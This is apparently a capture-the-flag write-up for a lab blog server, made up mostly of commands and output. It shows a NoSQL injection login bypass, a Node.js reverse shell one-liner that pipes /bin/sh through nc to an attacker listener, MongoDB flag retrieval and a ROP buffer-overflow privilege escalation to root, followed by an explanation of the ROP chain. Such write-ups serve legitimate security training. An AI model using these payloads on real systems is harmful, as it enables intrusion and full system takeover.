```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Dave's Blog
| http-robots.txt: 1 disallowed entry 
|_/admin
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



```
<script>
    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;
      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }
  </script>
<
```


```
POST /admin HTTP/1.1
Host: dblog.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-None-Match: W/"4e6-U9SczEF/N4gIGd+2/xSd9iZzGO0"
Priority: u=0, i

{"username": {"$ne": null}, "password": {"$ne": null}}

---------------------------------------------------------------------------
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 02 Jan 2026 12:14:17 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NjczNTYwNTd9.3uhowHBsgrc7Y9W1SK1mJ8OXKhC_TtujmS7QT6z2JZc; Path=/
Location: /admin
Vary: Accept

<p>Found. Redirecting to <a href="/admin">/admin</a></p>

---------------------------------------------------------------------------

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NjczNTYwNTd9.3uhowHBsgrc7Y9W1SK1mJ8OXKhC_TtujmS7QT6z2JZc

{
  "isAdmin": true,
  "_id": "5ec6e5cf1dc4d364bf864107",
  "username": "dave",
  "password": "THM{SuperSe...dminPass...}",
  "__v": 0,
  "iat": 1767356057
}

```

```
require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0 9001 >/tmp/f', ()=>{})

 nc -lvnp 9001
listening on [any] 9001 ...
dave@daves-blog:~/blog$ 
dave@daves-blog:~/blog$

```

```
dave@daves-blog:~$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] 
2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2026-01-02T11:51:18.001+0000 I CONTROL  [initandlisten] 
2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] 
> show databases;
admin       0.000GB
config      0.000GB
daves-blog  0.000GB
local       0.000GB
> use <database>;
switched to db <database>
> show tables;
> use admin;
switched to db admin
> show tables;
system.version
> use daves-blog;
switched to db daves-blog
> show tables;
posts
users
whatcouldthisbes
> show whatcouldthisbes;
2026-01-02T12:26:53.317+0000 E QUERY    [thread1] Error: don't know how to show [whatcouldthisbes] :
shellHelper.show@src/mongo/shell/utils.js:953:11
shellHelper@src/mongo/shell/utils.js:706:15
@(shellhelp2):1:1
> db.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{993e107fc66844........d5b}", "__v" : 0 }

```

```
dave@daves-blog:~$ sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
dave@daves-blog:~$ cd /tmp
dave@daves-blog:/tmp$ ls
f        systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-resolved.service-5ET2p0
payload  systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-timesyncd.service-Nt1IIf
dave@daves-blog:/tmp$ rm payload
dave@daves-blog:/tmp$ python3 -c 'import sys; from struct import pack; \
> padding = b"A"*88; \
> pop_rdi = pack("<Q", 0x400803); \
> bin_sh = pack("<Q", 0x400840); \
> system_addr = pack("<Q", 0x4006be); \
> sys.stdout.buffer.write(padding + pop_rdi + bin_sh + system_addr)' > /tmp/rop_payload
dave@daves-blog:/tmp$ ls
f            systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-resolved.service-5ET2p0
rop_payload  systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-timesyncd.service-Nt1IIf
dave@daves-blog:/tmp$ (cat /tmp/rop_payload; echo "whoami"; cat) | sudo /uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Invalid choice
2
/bin/sh: 1: 2: not found
1
/bin/sh: 2: 1: not found

id
uid=0(root) gid=0(root) groups=0(root)
cd root
/bin/sh: 5: cd: can't cd to root
cd ..
cd root
ls
root.txt  setup.sh
cat root.txt

```

```
Overwriting the Return Address

In a normal program, when a function finishes, it looks at a specific spot on the stack (the Return Address) to know where to go back to.

By sending 88 bytes, we reach that exact spot. The next 8 bytes we send overwrite that address. Instead of the program going back to its normal routine, we hijack the CPU and tell it to jump to a Gadget.
2. The Power of the "Gadget" (pop rdi; ret)

In 64-bit Linux, if you want to run a command like system("/bin/sh"), you can't just put the argument on the stack. The CPU looks for the first argument in a specific "register" (a tiny, ultra-fast storage slot inside the CPU) called RDI.

    pop rdi: This instruction tells the CPU: "Take the very next value on the stack and put it into the RDI register."

    ret: This tells the CPU: "Now look at the next value on the stack and jump there."

By using the address 0x400803, we aren't running a function; we are using a tiny "snippet" of existing code to set up our attack.
3. The ROP Chain Execution

Think of the ROP (Return-Oriented Programming) chain like a series of dominoes. Once the first one falls (the overflow), the rest follow automatically:
Step	Address	Action	Result
1	0x400803	Jumps to pop rdi; ret	CPU starts executing our instructions.
2	0x400840	Popped into RDI	The CPU now holds the string "/bin/sh" in its argument slot.
3	0x4006be	Jumps to system()	The CPU runs system(RDI), which is system("/bin/sh").
4. Why (cat payload; cat)?

This is a clever trick for interacting with shells.

    The first cat sends the "exploit" to the program.

    The second cat keeps your keyboard connected to the program.

    Without that second cat, the shell would open, see that there is no more input coming, and immediately close.
```